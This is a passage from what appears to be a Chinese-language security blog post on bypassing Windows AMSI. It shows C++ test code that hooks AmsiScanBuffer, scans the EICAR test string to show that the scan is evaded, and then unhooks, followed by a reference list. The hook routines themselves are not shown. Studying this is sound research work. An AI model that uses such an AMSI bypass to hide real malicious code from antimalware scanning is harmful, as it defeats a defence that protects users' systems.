+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">//Declare test case to use
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    LPCWSTR fname <span style="color:#f92672">=</span> <span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;EICAR&#34;</span>;
+</span></span><span style="display:flex;"><span>    BYTE<span style="color:#f92672">*</span> sample <span style="color:#f92672">=</span> (BYTE<span style="color:#f92672">*</span>)EICAR;
+</span></span><span style="display:flex;"><span>    ULONG size <span style="color:#f92672">=</span> strlen(EICAR);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    std<span style="color:#f92672">::</span>cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;[+] Hooking AmsiScanBuffer&#34;</span> <span style="color:#f92672">&lt;&lt;</span> std<span style="color:#f92672">::</span>endl;
+</span></span><span style="display:flex;"><span>    HookAmsi();
+</span></span><span style="display:flex;"><span>    std<span style="color:#f92672">::</span>cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;[+] AmsiScanBuffer Hooked&#34;</span> <span style="color:#f92672">&lt;&lt;</span> std<span style="color:#f92672">::</span>endl;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    ZeroMemory(<span style="color:#f92672">&amp;</span>amsiContext, <span style="color:#66d9ef">sizeof</span>(amsiContext));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    hResult <span style="color:#f92672">=</span> AmsiInitialize(<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;AmsiHook&#34;</span>, <span style="color:#f92672">&amp;</span>amsiContext);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (hResult <span style="color:#f92672">!=</span> S_OK) {
+</span></span><span style="display:flex;"><span>        std<span style="color:#f92672">::</span>cout <span style="color:#f92672">&lt;&lt;</span> std<span style="color:#f92672">::</span>system_category().message(hResult) <span style="color:#f92672">&lt;&lt;</span> std<span style="color:#f92672">::</span>endl;
+</span></span><span style="display:flex;"><span>        std<span style="color:#f92672">::</span>cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;[-] AmsiInitialize Failed&#34;</span> <span style="color:#f92672">&lt;&lt;</span> std<span style="color:#f92672">::</span>endl;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> hResult;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    hResult <span style="color:#f92672">=</span> AmsiOpenSession(amsiContext, <span style="color:#f92672">&amp;</span>hSession);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (hResult <span style="color:#f92672">!=</span> S_OK) {
+</span></span><span style="display:flex;"><span>        std<span style="color:#f92672">::</span>cout <span style="color:#f92672">&lt;&lt;</span> std<span style="color:#f92672">::</span>system_category().message(hResult) <span style="color:#f92672">&lt;&lt;</span> std<span style="color:#f92672">::</span>endl;
+</span></span><span style="display:flex;"><span>        std<span style="color:#f92672">::</span>cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;[-] AmsiOpenSession Failed&#34;</span> <span style="color:#f92672">&lt;&lt;</span> std<span style="color:#f92672">::</span>endl;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> hResult;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    hResult <span style="color:#f92672">=</span> AmsiScanBuffer(amsiContext, sample, size, fname, hSession, <span style="color:#f92672">&amp;</span>res);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (hResult <span style="color:#f92672">!=</span> S_OK) {
+</span></span><span style="display:flex;"><span>        std<span style="color:#f92672">::</span>cout <span style="color:#f92672">&lt;&lt;</span> std<span style="color:#f92672">::</span>system_category().message(hResult) <span style="color:#f92672">&lt;&lt;</span> std<span style="color:#f92672">::</span>endl;
+</span></span><span style="display:flex;"><span>        std<span style="color:#f92672">::</span>cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;[-] AmsiScanBuffer Failed &#34;</span> <span style="color:#f92672">&lt;&lt;</span> std<span style="color:#f92672">::</span>endl;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> hResult;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    std<span style="color:#f92672">::</span>cout <span style="color:#f92672">&lt;&lt;</span> GetResultDescription(res) <span style="color:#f92672">&lt;&lt;</span> std<span style="color:#f92672">::</span>endl;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    std<span style="color:#f92672">::</span>cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;[+] Unhooking AmsiScanBuffer&#34;</span> <span style="color:#f92672">&lt;&lt;</span> std<span style="color:#f92672">::</span>endl;
+</span></span><span style="display:flex;"><span>    UnhookAmsi();
+</span></span><span style="display:flex;"><span>    std<span style="color:#f92672">::</span>cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;[+] AmsiScanBuffer Unhooked&#34;</span> <span style="color:#f92672">&lt;&lt;</span> std<span style="color:#f92672">::</span>endl;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>上述代码同时进行了HOOK并输入了EICAR的恶意代码，可以看到此时成功绕过了AMSI的检测，并没有进行禁止输入的响应。</p>
+<p><img src="../amsi/18.png" alt="img"></p>
+<h2 id="reference">Reference</h2>
+<p>[1] <a href="https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal">https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal</a></p>
+<p>[2] <a href="https://github.com/fdiskyou/injectAllTheThings">https://github.com/fdiskyou/injectAllTheThings</a></p>
+<p>[3] <a href="https://blog.csdn.net/qing666888/article/details/81540683">https://blog.csdn.net/qing666888/article/details/81540683</a></p>
+<p>[4] <a href="https://twitter.com/_xpn_/status/1069759374984429568">https://twitter.com/_xpn_/status/1069759374984429568</a></p>
+<p>[5] <a href="https://twitter.com/mattifestation/status/1071034781020971009">https://twitter.com/mattifestation/status/1071034781020971009</a></p>
+<p>[6] <a href="https://github.com/atxsinn3r/amsiscanner/blob/master/amsiscanner.cpp">https://github.com/atxsinn3r/amsiscanner/blob/master/amsiscanner.cpp</a></p>
+<p>[7] <a href="https://www.anquanke.com/post/id/168210">https://www.anquanke.com/post/id/168210</a></p>
+<p>[8] <a href="https://docs.microsoft.com/en-us/archive/blogs/daviddasneves/powershell-security-at-enterprise-customers">https://docs.microsoft.com/en-us/archive/blogs/daviddasneves/powershell-security-at-enterprise-customers</a></p>
+<p>[9] <a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-flushinstructioncache">https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-flushinstructioncache</a></p>
+<p>[10] <a href="https://posts.specterops.io/antimalware-scan-interface-detection-optics-analysis-methodology-858c37c38383">https://posts.specterops.io/antimalware-scan-interface-detection-optics-analysis-methodology-858c37c38383</a></p>
+<p>[11] <a href="https://blog.csdn.net/weixin_44001905/article/details/109633482">https://blog.csdn.net/weixin_44001905/article/details/109633482</a></p>
+
+    </div>
+    <div class="post-footer">
+      
+    </div>
+
+  </article>
+
+    </main>
+  </body>
+</html>
